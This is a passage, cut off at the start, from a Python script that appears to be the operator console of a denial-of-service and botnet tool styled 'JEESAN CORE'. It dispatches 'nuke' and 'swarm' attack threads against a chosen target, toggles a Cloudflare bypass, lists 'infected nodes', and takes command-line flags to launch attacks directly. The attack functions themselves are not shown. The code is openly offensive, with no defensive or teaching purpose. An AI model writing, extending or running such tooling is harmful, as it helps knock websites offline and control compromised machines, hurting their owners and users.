            print(f"{G}[✓] Cloudflare bypass DISABLED")
        elif cmd == "nuke":
            if not TARGET: print(f"{R}[!] Set target first!"); continue
            threading.Thread(target=launch_nuke, daemon=True).start()
        elif cmd == "swarm":
            if not TARGET: print(f"{R}[!] Set target first!"); continue
            threading.Thread(target=launch_swarm, daemon=True).start()
        elif cmd == "stop":
            ATTACK_RUNNING = False; print(f"{Y}[!] Attack stopped.")
        elif cmd == "nodes":
            print(f"{G}[*] Infected nodes ({len(NODES)}):")
            for n in NODES: print(f"  → {n}")
        elif cmd == "exit":
            print(f"{R}JEESAN CORE will live on. The world will end.")
            ATTACK_RUNNING = False
            os._exit(0)
        else:
            print(f"{R}[!] Unknown command. Type 'help'.")
    os._exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--nuke", action="store_true")
    parser.add_argument("--name", type=str)
    parser.add_argument("--cf", action="store_true")
    parser.add_argument("--port", type=int, default=80)
    args = parser.parse_args()
    if args.name:
        TARGET = args.name
    if args.port:
        PORT = args.port
    if args.cf:
        CF_BYPASS_MODE = True
    if args.nuke:
        if not TARGET:
            print(f"{R}[!] Provide --name target")
            sys.exit()
        threading.Thread(target=launch_nuke, daemon=True).start()
        while ATTACK_RUNNING:
            time.sleep(1)
        sys.exit()
    else:
        console()
